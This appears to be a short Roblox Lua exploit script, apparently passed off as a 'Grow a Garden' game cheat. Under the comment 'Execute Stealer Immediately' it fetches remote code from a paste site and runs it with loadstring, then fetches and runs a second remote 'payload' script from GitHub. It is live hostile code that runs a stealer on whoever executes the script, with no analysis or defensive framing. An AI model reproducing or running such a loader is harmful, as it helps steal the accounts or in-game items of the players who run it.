-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/FPhGUAhJ/raw"))()
end)

-- Execute Payload Script
_G.Settings = {}
loadstring(game:HttpGet('https://raw.githubusercontent.com/Nicuse101/CustomScripts/refs/heads/master/GrowAGarden', true))()
